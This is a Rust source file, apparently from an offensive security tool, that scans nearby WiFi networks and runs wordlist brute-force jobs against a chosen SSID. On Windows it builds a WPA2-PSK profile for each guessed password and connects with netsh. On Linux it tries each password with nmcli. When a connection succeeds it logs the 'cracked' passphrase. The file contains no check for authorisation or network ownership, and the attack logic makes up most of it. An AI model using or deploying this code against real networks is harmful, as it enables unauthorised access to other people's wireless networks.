use super::jobs::{finish_job, log_job, register_job, should_stop, update_progress, BruteJobResult};
use super::shell::{command_exists, run_timed_shell};
use super::wordlists::load_wordlist_lines;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub channel: String,
    pub signal: i32,
    pub security: String,
    pub in_use: bool,
}

pub async fn scan_wifi_networks() -> Result<Vec<WifiNetwork>, String> {
    #[cfg(target_os = "windows")]
    {
        if command_exists("netsh").await {
            return scan_netsh().await;
        }
        return Err("netsh not available — WiFi scan requires Windows networking tools.".to_string());
    }

    #[cfg(not(target_os = "windows"))]
    {
        if command_exists("nmcli").await {
            return scan_nmcli().await;
        }
        if command_exists("iw").await {
            return scan_iw().await;
        }
        Err("No WiFi tools found. Install NetworkManager (nmcli) or iw.".to_string())
    }
}

#[cfg(target_os = "windows")]
async fn scan_netsh() -> Result<Vec<WifiNetwork>, String> {
    let out = run_timed_shell("netsh wlan show networks mode=bssid", 15).await?;
    let mut networks = Vec::new();
    let mut current_ssid = String::new();
    let mut current_security = String::new();
    let mut current_signal = 0i32;
    let mut current_bssid = String::new();

    for line in out.lines() {
        let t = line.trim();
        if let Some(ssid) = t.strip_prefix("SSID ") {
            if let Some((_, name)) = ssid.split_once(" : ") {
                if !current_ssid.is_empty() {
                    networks.push(WifiNetwork {
                        ssid: current_ssid.clone(),
                        bssid: current_bssid.clone(),
                        channel: String::new(),
                        signal: current_signal,
                        security: current_security.clone(),
                        in_use: false,
                    });
                }
                current_ssid = name.trim().to_string();
                current_bssid.clear();
                current_signal = 0;
                current_security = "unknown".to_string();
            }
        } else if t.starts_with("Authentication") {
            if let Some((_, v)) = t.split_once(':') {
                current_security = v.trim().to_string();
            }
        } else if t.contains("Signal") && t.contains('%') {
            if let Some(pct) = t.split(':').nth(1) {
                current_signal = pct.trim().trim_end_matches('%').parse().unwrap_or(0);
            }
        } else if t.starts_with("BSSID") {
            if let Some((_, mac)) = t.split_once(':') {
                current_bssid = mac.trim().to_string();
            }
        }
    }
    if !current_ssid.is_empty() {
        networks.push(WifiNetwork {
            ssid: current_ssid,
            bssid: current_bssid,
            channel: String::new(),
            signal: current_signal,
            security: current_security,
            in_use: false,
        });
    }
    networks.sort_by(|a, b| b.signal.cmp(&a.signal));
    networks.dedup_by(|a, b| a.ssid == b.ssid);
    Ok(networks)
}

async fn scan_nmcli() -> Result<Vec<WifiNetwork>, String> {
    let _ = run_timed_shell("nmcli device wifi rescan 2>/dev/null", 8).await;
    let out = run_timed_shell(
        "nmcli -t -f IN-USE,SSID,BSSID,CHAN,SIGNAL,SECURITY device wifi list 2>/dev/null",
        12,
    )
    .await?;

    let mut networks = Vec::new();
    for line in out.lines() {
        if line.trim().is_empty() {
            continue;
        }
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() < 6 {
            continue;
        }
        let ssid = parts[1].replace("\\:", ":");
        if ssid.is_empty() || ssid == "--" {
            continue;
        }
        networks.push(WifiNetwork {
            in_use: parts[0] == "*",
            ssid,
            bssid: parts[2].to_string(),
            channel: parts[3].to_string(),
            signal: parts[4].parse().unwrap_or(0),
            security: parts[5].to_string(),
        });
    }
    networks.sort_by(|a, b| b.signal.cmp(&a.signal));
    networks.dedup_by(|a, b| a.ssid == b.ssid && a.bssid == b.bssid);
    Ok(networks)
}

async fn scan_iw() -> Result<Vec<WifiNetwork>, String> {
    let iface = run_timed_shell(
        "iw dev 2>/dev/null | awk '/Interface/ {print $2; exit}'",
        5,
    )
    .await
    .unwrap_or_else(|_| "wlan0".to_string());
    let out = run_timed_shell(&format!("iw dev {iface} scan 2>/dev/null"), 15).await?;
    let mut networks = Vec::new();
    let mut current_ssid = String::new();
    let mut current_bssid = String::new();
    let mut signal = 0i32;
    let mut security = "unknown".to_string();

    for line in out.lines() {
        let t = line.trim();
        if t.starts_with("BSS ") {
            if !current_ssid.is_empty() {
                networks.push(WifiNetwork {
                    ssid: current_ssid.clone(),
                    bssid: current_bssid.clone(),
                    channel: String::new(),
                    signal,
                    security: security.clone(),
                    in_use: false,
                });
            }
            current_bssid = t
                .strip_prefix("BSS ")
                .unwrap_or("")
                .split('(')
                .next()
                .unwrap_or("")
                .to_string();
            current_ssid.clear();
            signal = 0;
            security = "open".to_string();
        } else if let Some(s) = t.strip_prefix("SSID: ") {
            current_ssid = s.to_string();
        } else if let Some(s) = t.strip_prefix("signal: ") {
            signal = s.trim_end_matches(" dBm").parse().unwrap_or(0);
        } else if t.contains("RSN") || t.contains("WPA") {
            security = "WPA".to_string();
        }
    }
    if !current_ssid.is_empty() {
        networks.push(WifiNetwork {
            ssid: current_ssid,
            bssid: current_bssid,
            channel: String::new(),
            signal,
            security,
            in_use: false,
        });
    }
    Ok(networks)
}

fn shell_escape(s: &str) -> String {
    s.replace('\'', "'\\''")
}

pub async fn start_wifi_bruteforce(
    ssid: String,
    wordlist_id: String,
    bssid: Option<String>,
) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        if !command_exists("netsh").await {
            return Err("netsh required for WiFi testing on Windows.".to_string());
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        if !command_exists("nmcli").await {
            return Err("nmcli required for WiFi testing. Install NetworkManager.".to_string());
        }
    }

    let passwords = load_wordlist_lines(&wordlist_id).await?;
    if passwords.is_empty() {
        return Err("Wordlist is empty".to_string());
    }

    let total = passwords.len() as u32;
    let target = ssid.clone();
    let (job_id, stop) = register_job("wifi", &target, total).await;
    let return_id = job_id.clone();

    tokio::spawn(async move {
        #[cfg(target_os = "windows")]
        run_wifi_job_windows(&job_id, stop, &ssid, passwords).await;
        #[cfg(not(target_os = "windows"))]
        run_wifi_job_linux(&job_id, stop, &ssid, bssid.as_deref(), passwords).await;
    });

    Ok(return_id)
}

#[cfg(target_os = "windows")]
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

#[cfg(target_os = "windows")]
fn windows_wifi_profile_xml(ssid: &str, password: &str) -> String {
    format!(
        r#"<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>{ssid}</name>
  <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <MSM><security>
    <authEncryption>
      <authentication>WPA2PSK</authentication>
      <encryption>AES</encryption>
      <useOneX>false</useOneX>
    </authEncryption>
    <sharedKey>
      <keyType>passPhrase</keyType>
      <protected>false</protected>
      <keyMaterial>{pass}</keyMaterial>
    </sharedKey>
  </security></MSM>
</WLANProfile>"#,
        ssid = xml_escape(ssid),
        pass = xml_escape(password),
    )
}

#[cfg(target_os = "windows")]
async fn run_wifi_job_windows(
    job_id: &str,
    stop: Arc<std::sync::atomic::AtomicBool>,
    ssid: &str,
    passwords: Vec<String>,
) {
    let total = passwords.len() as u32;
    log_job(
        job_id,
        &format!("Testing {total} passwords against '{ssid}' via netsh (10s/attempt cap)."),
    )
    .await;

    for (i, pass) in passwords.iter().enumerate() {
        if should_stop(&stop, job_id).await {
            finish_job(job_id, "stopped", None).await;
            return;
        }

        let tried = (i + 1) as u32;
        update_progress(job_id, tried, total, pass).await;

        let profile_path = std::env::temp_dir().join(format!("fulgul-wifi-{job_id}.xml"));
        let xml = windows_wifi_profile_xml(ssid, pass);
        if tokio::fs::write(&profile_path, &xml).await.is_err() {
            continue;
        }

        let path = profile_path.display();
        let esc_ssid = ssid.replace('"', "\\\"");
        let cmd = format!(
            "netsh wlan delete profile name=\"{esc_ssid}\" >nul 2>&1 & \
             netsh wlan add profile filename=\"{path}\" >nul 2>&1 & \
             netsh wlan connect name=\"{esc_ssid}\" >nul 2>&1 & \
             timeout /t 3 /nobreak >nul & \
             netsh wlan show interfaces"
        );

        match run_timed_shell(&cmd, 12).await {
            Ok(out) => {
                let lower = out.to_lowercase();
                if lower.contains("state") && lower.contains("connected") && lower.contains(&ssid.to_lowercase()) {
                    log_job(job_id, &format!("✓ Valid passphrase found: {pass}")).await;
                    let _ = run_timed_shell(
                        &format!("netsh wlan delete profile name=\"{esc_ssid}\""),
                        5,
                    )
                    .await;
                    finish_job(
                        job_id,
                        "completed",
                        Some(BruteJobResult {
                            success: true,
                            credential: Some(format!("{ssid}:{pass}")),
                            username: None,
                            password: Some(pass.clone()),
                            message: format!("WiFi passphrase found for '{ssid}'"),
                        }),
                    )
                    .await;
                    let _ = tokio::fs::remove_file(&profile_path).await;
                    return;
                }
            }
            Err(e) if i % 10 == 0 => log_job(job_id, &e).await,
            _ => {}
        }

        let _ = run_timed_shell(&format!("netsh wlan delete profile name=\"{esc_ssid}\""), 5).await;
        let _ = tokio::fs::remove_file(&profile_path).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
    }

    finish_job(
        job_id,
        "completed",
        Some(BruteJobResult {
            success: false,
            credential: None,
            username: None,
            password: None,
            message: format!("No valid passphrase in wordlist for '{ssid}'"),
        }),
    )
    .await;
}

#[cfg(not(target_os = "windows"))]
async fn run_wifi_job_linux(

    job_id: &str,
    stop: Arc<std::sync::atomic::AtomicBool>,
    ssid: &str,
    bssid: Option<&str>,
    passwords: Vec<String>,
) {
    let total = passwords.len() as u32;
    log_job(
        job_id,
        &format!("Testing {total} passwords against SSID '{ssid}' (nmcli, 8s/attempt cap)."),
    )
    .await;

    for (i, pass) in passwords.iter().enumerate() {
        if should_stop(&stop, job_id).await {
            finish_job(job_id, "stopped", None).await;
            return;
        }

        let tried = (i + 1) as u32;
        update_progress(job_id, tried, total, pass).await;

        let esc_ssid = shell_escape(ssid);
        let esc_pass = shell_escape(pass);
        let bssid_arg = bssid
            .map(|b| format!(" {b}"))
            .unwrap_or_default();

        let cmd = format!(
            "nmcli -w 8 device wifi connect '{esc_ssid}'{bssid_arg} password '{esc_pass}' 2>&1; \
             nmcli connection down '{esc_ssid}' 2>/dev/null; \
             nmcli connection delete '{esc_ssid}' 2>/dev/null; true"
        );

        match run_timed_shell(&cmd, 12).await {
            Ok(out) => {
                let lower = out.to_lowercase();
                if lower.contains("successfully activated")
                    || lower.contains("connection successfully")
                    || lower.contains("ip4")
                {
                    log_job(job_id, &format!("✓ Valid passphrase found: {pass}")).await;
                    finish_job(
                        job_id,
                        "completed",
                        Some(BruteJobResult {
                            success: true,
                            credential: Some(format!("{ssid}:{pass}")),
                            username: None,
                            password: Some(pass.clone()),
                            message: format!("WiFi passphrase cracked for '{ssid}'"),
                        }),
                    )
                    .await;
                    return;
                }
                if lower.contains("secrets were required")
                    || lower.contains("password")
                    || lower.contains("denied")
                {
                    // expected failure — continue
                } else if lower.contains("timed out") {
                    log_job(job_id, &format!("Attempt timed out for '{pass}' — skipping.")).await;
                }
            }
            Err(e) => {
                if i % 10 == 0 {
                    log_job(job_id, &format!("Attempt error: {e}")).await;
                }
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
    }

    finish_job(
        job_id,
        "completed",
        Some(BruteJobResult {
            success: false,
            credential: None,
            username: None,
            password: None,
            message: format!("No valid passphrase in wordlist for '{ssid}'"),
        }),
    )
    .await;
}
